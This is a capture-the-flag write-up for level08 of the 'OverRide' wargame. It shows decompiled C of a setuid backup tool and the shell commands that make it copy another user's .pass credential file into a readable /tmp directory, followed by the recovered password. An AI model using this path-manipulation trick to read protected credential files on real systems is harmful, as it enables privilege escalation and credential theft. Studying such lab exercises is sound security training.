This level is a program that expects a file in argv[1] in order to save it.

We can see that the program opens the file provided as an argument.
```c
FILE* rax_12 = fopen(argv[1], &data_400da9);
if (rax_12 == 0)
{
    printf("ERROR: Failed to open %s\n", argv[1]);
    exit(1);
    /* no return */
}
```
And then it will open the same file in ./backups/ and write its content into it.

```c
strncat(&var_78, argv[1], (0x63 - ((!rcx) - 1)));
int32_t rax_22 = open(&var_78, 0xc1, 0x1b0);
if (rax_22 < 0)
{
    printf("ERROR: Failed to open %s%s\n", "./backups/", argv[1]);
    exit(1);
    /* no return */
}
while (true)
{
    var_79 = fgetc(rax_12);
    if (var_79 == 0xff)
    {
        break;
    }
    write(rax_22, &var_79, 1);
}
```

Simply by going into tmp to have file creation rights, we can create the directories /home/users/level09/

```
level08@OverRide:/tmp$ mkdir -p ./backups/home/users/level09
```

Then execute the program from the tmp directory 
```
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
```

```
level08@OverRide:/tmp$ cat backups/home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```